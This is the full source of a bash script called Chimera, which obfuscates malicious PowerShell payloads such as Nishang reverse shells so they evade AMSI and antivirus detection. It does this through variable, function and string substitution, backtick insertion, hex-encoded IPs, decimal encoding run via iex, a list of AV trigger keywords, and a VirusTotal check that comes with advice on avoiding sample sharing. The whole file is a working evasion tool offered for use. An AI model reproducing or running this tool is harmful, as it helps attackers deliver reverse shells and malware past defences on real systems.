#!/bin/bash

# Chimera is a (shiny and very hack-ish) PowerShell obfuscation script
# designed to bypass AMSI and antivirus solutions. It digests malicious
# PS1's known to trigger AV and uses string substitution and variable
# concatenation to evade common detection signatures.

# write-up: https://null-byte.com/bypass-amsi-0333967/

# depends: apt-get update && apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils

# usage: ./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 4 -v -t -c -i -p -s ascii,get-location,getstream -b invoke-expression,new-object,reverse,powershell -j -g -r -h -o /tmp/chimera.ps1

# timestamp for filenames
timestamp="$(date +%H%M%S)";

# used for filenames and other small instances, the value is mostly arbitrary
t="chimera";

# colors
c=("\e[0m" "\e[1;31m" "\e[93m" "\e[92m" "\e[94m" "\e[1;31m");

# function for printing fancy output messages: C=color, B=begin, E=end
function msg () {
	case "$2" in
		1) C=("${c[1]}" "sleep 1.5"); B=""; E="\n" ;;
		2) C=("${c[2]}" "sleep .35"); B=" "; E="\n" ;;
		3) C=("${c[3]}" "sleep .15"); B="  "; E="" ;;
		0) C=("${c[4]}" "sleep .55"); B="\n"; E="\n" ;;
		*) B="   " ;;
	esac;
	if [[ -z "$quiet" ]]; then
		echo -e "$B${C[0]} ░${c[0]} $1 $E";
		eval "${C[1]}"; # for release
		unset C B E;
	fi
};

function help_menu () {
	unset quiet;
	msg "./$t --file powershell.ps1 --all --output /tmp/payload.ps1\n
  files:
    -f, --file\t\tpowershell file.ps1 to obfuscate
    -o, --output\toverride default output file location

  options:
    -a, --all\t\tsame as: -l 0 -v -t -c -i -p -h -s -b -j -k -e
    -l, --level\t\tlevel of string manipulation (0=random,1=low,\n\t\t\t2=med,3=high,4=higher,5=insane. default: 0)
    -v, --variables\treplace variables with arbitrary strings,\n\t\t\tuse -v </usr/share/dict/words> to utilize\n\t\t\tcustom wordlist as variable name substitutions
    -t, --typedata\treplace data types with arbitrary strings (e.g.,\n\t\t\tSystem.IO.StreamWriter). use -t <string,string> to\n\t\t\tinclude more
    -c, --comments\treplace comments with arbitrary strings\n\t\t\tuse -c <custom_comments.txt> to utillized custom\n\t\t\ttext instead of random strings
    -i, --insert\tinsert arbitrary comments into every line
    -h, --hex\t\tconvert ip addresses to hexidecimal values
    -s, --string\tobfuscate provided strings, use -s <getstream,getstring>
    -b, --backticks\tinsert backticks into provided string, e.g., ne\`w\`-OB\`je\`cT
    -j, --functions\treplace function names with arbitrary strings
    -d, --decimal\tconvert obfuscated payload to decimal format\n\t\t\timproves AMSI evasion; increases AV detection
    -g, --nishang\tremove nishang-specific characteristics
    -k, --keywords\tsearch obfuscated output for words that may trigger\n\t\t\tAV/VT. By default searches for common words (backdoor,\n\t\t\tpayload,nishang), use -k <word,word> to include more
    -r, --random\trandomize character punctuation
    -p, --prepend\tprepend random number of spaces to lines\n
  misc:
    -e, --examine\tpreview snippets of output file contents
    -q, --quiet\t\tsupress non-essential messages
    -z, --no-art\tif you hate awesome ascii art
        --help\t\tyou're looking at it\n";
	exit
};

# level array for different functions and obfuscating in varying degrees
lvl=("25-1000" "125-2000" "40" "$(shuf -i 3-8 -n 1)" "6");

# function to process different command line arguments
function args () {
	while [[ "$#" != 0 ]]; do
		case "$1" in
			-f | --file) f="$2" ;;
			-o | --output) chimera="$2" ;;
			-l | --level)
			case "$2" in
				1) lvl=("20-45" "25-125" "12" "4" "1") ;;
				2) lvl=("75-125" "125-250" "40" "3" "2") ;;
				3) lvl=("125-225" "125-500" "40" "2" "3") ;;
				4) lvl=("225-325" "500-1000" "40" "2" "4") ;;
				5) lvl=("500-750" "1000-2000" "40" 1 "5") ;;
				0) lvl=("25-1000" "125-2000" "40" "$(shuf -i 1-4 -n 1)" "6") ;;
				# undocumented overkill mode, good luck...
				over9000) lvl=("1500-3500" "1000-2500" "52" 1 "7") ;;
				*) msg "invalid --level specified: $2" 1; help_menu ;;
			esac;
			shift
			;;
			-g | --nishang) nishang_script=1 ;;
			-r | --random) random_case=1 ;;
			-v | --variables)
			replace_variables=1;
			[[ "$2" != -* ]] &&
				dictionary="$2" ;;
			-c | --comments)
			replace_comments=1;
			[[ "$2" != -* ]] &&
				custom_comments="$2" ;;
			-t | --typedata)
			replace_datatypes=1;
			[[ "$2" != -* ]] &&
				addtriggers="$2" ;;
			-s | --string)
			replace_strings=1;
			[[ "$2" != -* ]] &&
				addstrings="$2" ;;
			-i | --insert) insert_comments=1 ;;
			-p | --prepend) prepend_indentations=1 ;;
			-k | --keywords)
			search_keywords=1;
			[[ "$2" != -* ]] &&
				addkeywords="$2" ;;
			-h | --hex) hex_addresses=1 ;;
			-d | --decimal) convert_decimal=1 ;;
			-x | --virustotal)
				vt_check=1;
				unset vt_check;
				;;
			-a | --all) enable_all=1 ;;
			-b | --backticks)
			backticker=1;
			[[ "$2" != -* ]] &&
				custom_backticks="$2" ;;
			-j | --functions) replace_functions=1 ;;
			-z | --no-art) ascii_art=1 ;;
			-q | --quiet)
			quiet=1; ascii_art=1 ;;
			-e | --examine) examine_file=1 ;;
			--help) help_menu ;;
		esac;
		shift;
	done
};
args "$@";

# if no `--file input.ps1`, print help and exit
[[ ! -f "$f" ]] &&
	help_menu;

function ascii_art () {
	clear;
	banner=" _____________________________________________________

  ░░░░░░ ░░   ░░ ░░ ░░░    ░░░ ░░░░░░░ ░░░░░░   ░░░░░
 ▒▒      ▒▒   ▒▒ ▒▒ ▒▒▒▒  ▒▒▒▒ ▒▒      ▒▒   ▒▒ ▒▒   ▒▒
 ▓▓      ▓▓▓▓▓▓▓ ▓▓ ▓▓ ▓▓▓▓ ▓▓ ▓▓▓▓▓   ▓▓▓▓▓▓  ▓▓▓▓▓▓▓
 ██      ██   ██ ██ ██  ██  ██ ██      ██   ██ ██   ██
  ██████ ██   ██ ██ ██      ██ ███████ ██   ██ ██   ██
 _____________________________________________________";

	# mind-blowing banner rendering
	for ((b=0; b<${#banner}; b++ ));do
		sleep .001;
		printf "${c[1]}%s${c[0]}" "${banner:$b:1}";
	done;
	printf "\n\n ░ by @tokyoneon_\n\n"
	sleep 1.5 # for release
};

[[ -z "$ascii_art" && -z "$quiet" ]] &&
	ascii_art;

# `$chimera` = output file, timestamp is appended to the filename if `-o`
# is not specified
[[ -z "$chimera" ]] &&
	chimera="${f}-$t-$timestamp.ps1" # for release

# copy the input file
cp "$f" "$chimera";

# generates random lowercase alpha strings for faux comments
function create_junk () {
	junk="$(tr -dc '[:lower:]' </dev/urandom | head -c "$(shuf -i "${lvl[1]}" -n 1)")";
	junk="$(sed -e 's/\/\|[+=qxzpwty]/ /gI' -e 's/  \|   /\. /g' <<< "$junk")"
};

# generates random alphanumeric strings for various functions
function create_rand () {
	rand="$(tr -dc A-Za-z </dev/urandom | head -c "$(shuf -i "${lvl[0]}" -n 1)")"
};

# use `head` and `tail` with `xxd` output to preview the beginning and end of
# the output file
function use_xxd () {
	[[ -z "$quiet" ]] && {
		for g in head tail;do
			xxd "$chimera" | "$g" -n3 | sed 's/^/    ░ /g';
			[[ "$count" -le '2' ]] &&
				echo " ";
			((count++));
		done
	}
};

# sometimes i like to see snippets of the final obfuscated product
function examine_file () {
	msg "Preview File Contents" 0;
	count='2';
	use_xxd
};

# randomize character punctuations
function case_random () {
	msg "Randomized character punctuation: ${lvl[4]} iterations" 2;
	msg "Unmodified source" 3;
	use_xxd;
	iter=1;
	while [[ "$iter" -le "${lvl[4]}" ]]; do
		# y is arbitrary. `sed` uses L and U for Lowercase and Uppercase
		for y in L U; do
			create_rand;
			rand="${rand:0:13}";
			sed -i "s/[${rand^^}]/\\$y&/gI" "$chimera";
		done;
		((iter++));
	done;
	msg "Modified source" 3;
	use_xxd
};

function random_case () {
	msg "Character Randomization" 0;
	count=0;
	case_random
};

# `perl` might be the best way to convert massive files to decimal. the output
# is put into a variable and wrapped in a generic `iex` join command
function convert_decimal () {
	msg "Decimal Format Conversion" 0;
	trans="$(perl -nE 'say join ",", map ord, split //' "$chimera" | tr "\n" ",")";
	printf '%s' "iex(-join((${trans::-1})|%{[char]\$_}));exit" > "$chimera";
	count=0;
	if [[ "$backticker" ]]; then
		wrapper=(iex exit);
		for wrap in "${wrapper[@]}";do
			backticker "${wrap}";
			sed -i "s/${wrap}/${backticked}/gI" "$chimera";
			unset backticked
		done
	fi
	case_random
};

# functions detection isn't great. discovered functions are put into an array
# and replaced with random strings (create_rand)
function replace_functions () {
	msg "Function Substitution" 0;
	# create an array of discovered functions
	mapfile -t functions < <(sed -e "/<#/,/#>/d" -e 's/(/ /g' "$chimera" \
	| awk 'tolower($0) ~ /function [a-zA-Z]/{print $2}');
	msg "Detected: ${#functions[@]} functions" 2;
	if [[ -n "${functions[0]}" ]]; then
		# iterate through functions and replace function names with random values
		for func in "${functions[@]}"; do
			msg "Function: ${c[3]}${func^^}${c[0]}" 3;
			create_rand;
			sed -i "s/$func/$rand/g" "$chimera";
			msg "${rand:0:${lvl[2]}} ... $func";
		done;
	fi;
	[[ -z "$quiet" ]] &&
		printf "\n";
	msg "Replaced ${#functions[@]} functions"
};

# various sections use an arbitrary value (placeholder) to tell `sed` where to
# replace strings
placeholder="chimerachimerachimera";

# insert a random number of spaces into the beginning of each line
function prepend_indentations () {
	msg "Indentation Randomization" 0;
	line=1;
	# this double while-loop method is CPU intensive and clumbsy,
	# i hope to update it soon
	while read -r; do
		space=' ';
		s=0;
		while [[ "$s" -le "$(shuf -i 1-"${lvl[2]}" -n 1)" ]]; do
			((s++));
			space="${space} ";
		done;
		sed -i "${line}s/^/$space/" "$chimera";
		((line++));
	done < "$chimera";
	msg "Detected: $(wc -l "$chimera" | awk '{print $1}') lines" 2;
	msg "Inserted 1-${lvl[2]} spaces into each line" 3
};

# replace discovered comments with arbitrary text
function replace_comments () {
	msg "Comment Substitution" 0;
	msg "Detected: ${#comments[@]} comments" 2;
	# purge everything between document tags
	sed -i "/<#/,/#>/d" "$chimera";
	msg "Purged content between <#.*#> document tags" 3;
	# replace all existing comments with placeholder
	sed -i "s/\#.*/$placeholder/" "$chimera";
	# create an array of all lines containing comments
	mapfile -t comments < <(awk "/$placeholder/" "$chimera");
	count=0;
	# iterates through every comment
	while [[ "$count" -le "${#comments[@]}" ]]; do
		((count++));
		# if not used with a file contain custom comments
		if [[ -z "$custom_comments" ]]; then
			# create junk text
			create_junk;
			junk="$(sed -e 's/ \+/ /g' -e 's/\. [a-z]/\U&/g' <<< "$junk")";
			# replace first detected placeholder with junk text
			sed -i -e "0,/$placeholder/s//# $junk/" "$chimera";
		else
			# if used with a file containing custom comments, put every sentence
			# ending with a period `.` on a new line
			comms="$(sed 's/\([.!?]\) \([[:upper:]]\)/\1\n\2/g' "$custom_comments")";
			while [[ "$count" -le "$(wc -l "$chimera" | awk '{print $1}')" ]]; do
				while read -r line; do
					((count++));
					# substitute first discovered placeholder with a sentence from the
					# input file
					sed -i -e "0,/$placeholder/s//# $line/" "$chimera";
					[[ "$count" -le '5' ]] && msg "Comment ... '# ${line:0:40}'";
				done <<< "${comms[@]}";
			done;
		fi;
		[[ "$count" -le '5' ]] &&
			msg "Comment ... '# ${junk:0:40}'";
	done
};

# insert comments into every line
function insert_comments () {
	msg "Comment Insertion" 0;
	msg "Detected: ${#comments[@]} comments" 2;
	create_junk;
	# a placeholder is inserted into every line
	sed -i "s/^/$placeholder\n/" "$chimera";
	# count the numbered of placeholders
	mapfile -t comments < <(awk "/$placeholder/" "$chimera");
	msg "Inserted ${#comments[@]} comments" 3;
	replace_comments=1
};

# a function to iterate through strings and insert backticks (grave accent)
function backticker () {
	for i in "$@"; do
		for ((bt=0; bt<${#i}; bt++ )); do
			# avoid backticking certain characters: [a0befnrtuxv]
			# https://ss64.com/ps/syntax-esc.html
			if [[ "${i:$bt:1}" == [a0befnrtuxv] ]]; then
				backticked="${backticked}${i:$bt:1}";
			else
				# 75% chance an input character will be backticked
				grave=('`' '`' '`' '');
				grave=("${grave[$RANDOM % ${#grave[@]}]}");
				backticked="${backticked}${grave[0]}${i:$bt:1}";
			fi;
		done;
	done
};

# use -b <word,word> to backtick strings found in the input PS1
function custom_backticks () {
	msg "Custom Backtick Selector" 0;
	unset all;
	# take comma separated input (e.g., invoke-expression,getbytes) and put them
	# into an array
	if [[ -n "$custom_backticks" ]]; then
		IFS=',' read -ra add <<< "${custom_backticks[@]}";
		msg "Added: ${#add[@]} strings to array" 2;
		for a in "${add[@]}"; do
			msg "'$a'";
			allstrings+=("$a");
		done;
		# printf "\n";
		unset IFS add;
	fi;
	# if case randomization is enabled, do it now, before backticking input
	if [[ -n "$random_case" || -n "$enable_all" ]]; then
		for y in L U;do
			create_rand
			rand="${rand:0:10}";
			allstrings=("$(sed "s/[${rand^^}]/\\$y&/gI" <<< "${allstrings[@]}")");
		done;
	fi;
	read -ra allstrings <<< "${allstrings[@]}"
	# send string to `backticker` function and replace it in the output file
	# while read -rep a; do
	for a in "${allstrings[@]}"; do
		backticker "$a";
		sed -i "s/${a}/${backticked}/gI" "$chimera";
		unset backticked allstrings a;
	done
};

# this function will break a string into pieces, create variables for each piece
# and recompile the string in variable form
function transformer () {
	# redflags are strings like "system.net.sockets.tcpclient" that we may
	# want to obfuscate
	unset redflags;
	for str in "$@"; do
		check="$(grep -o --color=no -i "$str" "$chimera" | head -n1)";
		if [[ -n "$check" ]]; then
			redflags+=("$check");
			str="$check";
			msg "String: ${c[3]}${str}${c[0]}" 3;
			# break the input string into pieces and put into an array
			mapfile -t chunks < <(fold -w "${lvl[3]}" <<< "$str");
			for chunk in "${chunks[@]}"; do
				# if backticking is enabled, do it now
				if [[ -n "$backticker" || -n "$enable_all" ]]; then
					backticker "$chunk";
					chunk="$backticked";
				fi;
				create_rand;
				msg "\$${rand:0:${lvl[2]}} ... '${c[3]}${chunk}${c[0]}'";
				# insert a new variable into the top of the output file
				sed -i "1s/^/\$$rand = \"$chunk\"\n/gI" "$chimera";
				# rebuild the pieces in variable form, as an array
				rebuild+=("\$$rand");
				unset backticked;
			done;
			# concat pieces in array into a single string
			newstring="$(printf '%s' "${rebuild[@]}")";
			create_rand;
			# with -n and -v quotes are not required, with -s quotes are escaped
			[[ -z "$esc" ]] &&
				unset esc;
			# substitute old string with new variable string
			sed -i "s/$str/$esc$newstring$esc/" "$chimera";
			unset chunk chunks rebuild newstring str add idk;
			[[ -z "$quiet" ]] &&
				printf "\n";
		fi;
	done;
	msg "Transformed ${#redflags[@]} antivirus triggers"
};

# substitute other strings like `getbytes` and `getstring`
function replace_strings () {
	msg "String Substitution" 0;
	allstrings=(getbytes getstring);
	# if -s <word,word>, add comma-separated input into above array
	if [[ -n "$addstrings" ]]; then
		IFS=',' read -ra addstr <<< "${addstrings[@]}";
		msg "Added: ${#addstr[@]} strings to array" 2;
		for item in "${addstr[@]}"; do
			msg "'$item'";
			allstrings+=("$item");
		done;
		[[ -z "$quiet" ]] &&
			printf "\n";
		unset IFS;
	fi;
	# enable quotation escaping
	esc='\"';
	# send array to transformer
	transformer "${allstrings[@]}"
};

# data types are separated into chunks, set into variables, and reconstructed
# in variable format
function replace_datatypes () {
	msg "Data Type Substitution" 0;
	triggers=(System.Net.Sockets.TcpClient
	System.IO.StreamWriter
	System.Byte
	System.Text.AsciiEncoding
	System.Diagnostics.ProcessStartInfo
	System.Diagnostics.Process
	System.Text.ASCIIEncoding
	Net.Sockets.TCPClient
	System.IO.StreamWriter
	System.Net.Networkinformation.Ping
	PSObject
	Net.WebClient
	System.Net.HttpListener
	Security.Principal.WindowsPrincipal
	System.Net.IPEndPoint
	TExT.AscIIENcoDINg
	io.strEamWritEr);

	# if -t <word,word>, add comma-separated input into above triggers array
	if [[ -n "$addtriggers" ]]; then
		IFS=',' read -ra add <<< "${addtriggers[@]}";
		msg "Added: ${#add[@]} strings to array" 2;
		for a in "${add[@]}";do
			msg "'$a'";
			triggers+=("$a");
		done;
		[[ -z "$quiet" ]] &&
			printf "\n";
		unset IFS add;
	fi;
	# disabled escape quotes when substituting strings
	unset esc;
	transformer "${triggers[@]}"
};


# convert `192.168.56.101` to `0xC0A83865`
function hex_addresses () {
	msg "IP Address Substitution" 0;
	# find IP addresses and place them into an array
	mapfile -t findIP < <(grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' "$chimera");
	msg "Detected: ${#findIP[@]} IP addresses" 2;
	# iterate through discovered IP address
	for ipaddr in "${findIP[@]}"; do
		# convert to hexidecimal format
		hexified="$(printf '0x';printf '%02X' ${ipaddr//./ })";
		# replace IP address with hex value in output file
		sed -i "s/$ipaddr/$hexified/g" "$chimera";
		msg "${hexified} ... $ipaddr" 3;
	done
};

# a function to process an input file (dictonary) and use random words
# as variable names, e.g., `$port = 1337` becomes `$VolcanicBread = 1337`
function create_words () {
	# turn input file into an array and omit comma's, short words, and
	# overly long words
	mapfile -t dict < <(sed -e "/^.\{,3\}$/d" -e '/^.\{7\}./d' -e "s/[']//g" "$dictionary" \
	| iconv -f utf8 -t ascii//TRANSLIT \
	| uniq -u);
	# two words are chosen from the array at random and concatenated
	count=1
	while [[ "$count" -le 2 ]];do
		rand="${dict[$RANDOM % ${#dict[@]}]^}$rand";
		((count++))
	done
};

# a function to substitute variables with random strings
function replace_variables () {
	msg "Variable Substitution" 0;
	# this is nightmarish, but it works. several `sed` and `awk` commands process
	# $variables's found in the input file. the variables are sorted, duplicates
	# are removed, and then organized by character length. long lines are
	# obfuscated first to prevent a variables like $port from being replaced with
	# $p substitutions. e.g., `$p` becomes `$apple` and `$port` becomes `$appleort`
	mapfile -t variables < <(sed -e "s/[=\.\"():|{};,'\`]\|\[\|\]/\n/g" -e 's/\$/\n\$/g' "$chimera" \
	| awk '/^\$/{print $1}' \
	| sort -u \
	| awk '{print length(), $0 | "sort -nr"}' \
	| awk '{print $2}');
	msg "Detected: ${#variables[@]} variables" 2;

	# iterate through discovered variables
	for var in "${variables[@]}";do
		if [[ -f "$dictionary" ]]; then
			create_words;
		else
			create_rand;
		fi;
		# don't modify built-in and other problematic variables
		ignore='\$_\|$true\|$false\|$read\|$verb\|$error\|$null\|$arg\|>\|&\|+\|@\|\/\|-\|\$$';
		if grep --color=always --color=no -qi "$ignore" <<< "$var"; then
			if [[ ! -f "$dictionary" ]]; then
				rand="$(printf %"${lvl[2]}"s\\n)";
				msg "skipping${rand:5:${lvl[2]}}  '$var'";
			else
				msg "skipping             '$var'";
			fi;
		else
			# substitute variables but also command line arguments
			# e.g., `-Port 4444` becomes `-WizardBicycle 4444`
			sed -i "s/${var}\>/\$$rand/gI" "$chimera";
			sed -i "s/-${var:1}\>/-$rand/gI" "$chimera";
			msg "\$${rand:0:${lvl[2]}} ... '${c[3]}$var${c[0]}'" 3;
		fi;
		unset rand;
	done
};

# a function to automatically checks the obfuscated file against virustotal
# try not to use this function! if a file is detected by virustotal AV engines,
# the sample is immediately shared with the other 75+ VT partners.
# https://support.virustotal.com/hc/en-us/articles/115002168385-Privacy-Policy
# try nodistribute first, if absolutely necessary: https://nodistribute.com/
function vt_check () {
	msg "VirusTotal Scan" 0;
	delay="180s";
	msg "The API requires 5-10 minutes to analyze samples. Press Ctrl+C to abort." 2;
	# where to save the virustotal POST and results data
	api_post="/tmp/vt-post-$timestamp-${f##*/}.txt";
	api_results="/tmp/vt-results-$timestamp-${f##*/}.txt";
	# API usage guide: https://developers.virustotal.com/reference#file-scan
	URL="https://www.virustotal.com/vtapi/v2/file/scan";
	# POST obfuscated file to virustotal
	curl -s -X POST --url "$URL" --form "apikey=$virustotal_api" --form "file=@$chimera" | jq . > "$api_post";
	# grab the md5 of the file for querying the virustotal report
	MD5="$(awk '/md5/{print $2}' "$api_post")";
	# uri with md5
	report="apikey=$virustotal_api&resource=${MD5//[\"\,]/}";
	# url
	URL="https://www.virustotal.com/vtapi/v2/file/report?$report";
	# if the query doesn't return "Scan finished", the virustotal function
	# will continue to sleep for 180s and query again
	while ! grep --color=always -i 'Scan finished,' "$api_results" > /dev/null 2>&1; do
		# `trap` to allow `ctrl`+`c` breakage
		trap break INT;
		# print the latest response from virustotal
		grep --color=always 'verbose_msg' "$api_results" 2> /dev/null;
		msg "VirusTotal needs more time to analyze sample: ${MD5//[\"\,]/}" 3;
		msg "Sleeping for ${delay} ...";
		sleep $delay;
		trap - INT;
		# check virustotal again
		curl -s "$URL" | jq . > "$api_results";
	done;
	# after "Scan finished" is detected, search the results file for
	# "positive" detections
	results="$(awk '/positives":/{print $2}' "$api_results" 2>/dev/null)";
	# if not 0 detections, print warning message in red
	if [[ "${results::-1}" != 0 ]]; then
		unset quiet;
		V=("${c[1]}" "1");
	else
		printf "\n";
		V=("${c[3]}" "3");
	fi;
	msg "VirusTotal: ${V[0]}${results::-1}${c[0]} detections. Report: $api_results" "${V[1]}"
};

# a function to remove some nishang-specific characteristics
function nishang_script () {
	msg "Nishang Obfuscation" 0;
	sed -i -e "s/Write-Verbose/#/gI" "$chimera";
	sed -i -e "s/Write-Output/#/gI" "$chimera";
	sed -i -e "s/Write-Warning/#/gI" "$chimera";
	sed -i -e "s/, Mandatory = \$true//gI" "$chimera";
	sed -i -e "s/, Mandatory = \$false//gI" "$chimera";
	sed -i -e "s/Mandatory = \$true, //gI" "$chimera";
	sed -i -e "s/Mandatory = \$false, //gI" "$chimera";
	sed -i -e "/validatepAttern/Id" "$chimera";
	msg "Done";
	replace_comments
};

# search the obfuscated file for keywords that ~may~ trigger AMSI.
# for accurate detections, see: https://github.com/RythmStick/AMSITrigger
function search_keywords () {
	msg "Trigger Keyword Search" 0;
	# a short list of triggers
	keywords=(obfuscat
	nishang
	payload
	virus
	malware
	hack
	reverse
	powershell
	icmp
	shell
	backdoor
	evil
	elevate
	privil
	regsitry
	script
	SanityCheck
	WindowsSanity
	execut
	scriptengine
	hidden
	bypass
	regedit.exe
	cmd.exe
	powershell.exe
	encode
	iex
	invoke-
	getstream
	new-object);

	# if -k <word,word>, take comma-separated input and place into above array
	if [[ -n "$addkeywords" ]]; then
		IFS=',' read -ra add <<< "${addkeywords[@]}";
		msg "Added: ${#add[@]} strings to array" 2;
		for key in "${add[@]}"; do
			msg "'$key'";
			keywords+=("$key");
		done;
		printf "\n";
		unset IFS key add;
	fi;

	# grep for words in the output file
	for key in "${keywords[@]}"; do
		if grep --color=always -qi "$key" "$chimera"; then
			# if the trigger is discovered, put into array
			words+=("$key");
		fi;
	done;
	msg "Detected: ${#words[@]} potential triggers" 2;

	[[ -n "${words[0]}" ]] &&
		detections="$(sed 's/ /\\\|/g' <<< "${words[@]}")";

	# add the line number and `grep` word highlighting to discovered triggers
	sed -e 's/^[ \t]*//' "$chimera" | nl | grep --color=always -i "${detections:-tokyoneon}";

	# take the discovered words and comma-separate for fancy output
	detections="$(IFS=,; printf '%s' "${words[*]}")";
	if [[ -n "${words[0]}" ]]; then
		[[ -z "$quiet" ]] && {
			printf "\n";
			msg "Potential triggers: $detections"
		};
	else
		msg "No antivirus triggers found." 3;
	fi
};

# printing the level at the start of every chimera execution
case "${lvl[4]}" in
	6) l="random" ;;
	7) l="${c[2]}IT'S OVER 9,000!!!!${c[0]} (good luck ...)" ;;
	*) l="${lvl[4]}" ;;
esac;

[[ -z "$quiet" ]] &&
	echo -e " ░ Starting $t with level: $l";

# all of the chimera functions, in preferred order
[[ -n "$nishang_script" || -n "$enable_all" ]] && nishang_script;
[[ -n "$random_case" ]] && random_case;
[[ -n "$replace_functions" || -n "$enable_all" ]] && replace_functions;
[[ -n "$replace_variables" || -n "$enable_all" ]] && replace_variables;
[[ -n "$hex_addresses" || -n "$enable_all" ]] && hex_addresses;
[[ -n "$replace_datatypes" || -n "$enable_all" ]] && replace_datatypes;
[[ -n "$replace_strings" || -n "$enable_all" ]] && replace_strings;
[[ -n "$insert_comments" || -n "$enable_all" ]] && insert_comments;
[[ -n "$replace_comments" || -n "$enable_all" ]] && replace_comments;
[[ -n "$prepend_indentations" || -n "$enable_all" ]] && prepend_indentations;
[[ -n "$custom_backticks" ]] && custom_backticks;
[[ -n "$search_keywords" || -n "$enable_all" ]] && search_keywords;
[[ -n "$convert_decimal" ]] && convert_decimal;
[[ -n "$examine_file" || -n "$enable_all" ]] && examine_file;
[[ -n "$vt_check" ]] && vt_check;

unset quiet;
# print the destination of the obfuscated file
msg "Obfuscated file: ${V[0]}$chimera${c[0]}" 0
